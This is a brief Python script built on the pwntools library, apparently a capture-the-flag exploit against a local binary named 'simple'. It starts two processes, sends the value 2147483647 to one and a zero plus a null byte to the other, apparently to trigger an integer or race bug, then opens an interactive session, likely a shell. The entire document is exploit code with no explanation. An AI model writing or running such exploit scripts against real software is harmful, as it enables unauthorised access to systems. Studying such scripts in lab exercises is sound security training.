from pwn import *

p1 = process('./simple')
p2 = process('./simple')

p1.sendlineafter(':', '2147483647')
sleep(0.1)

p2.sendlineafter(':', '0')
p2.sendafter(':', '\x00')

p2.interactive()
p1.close()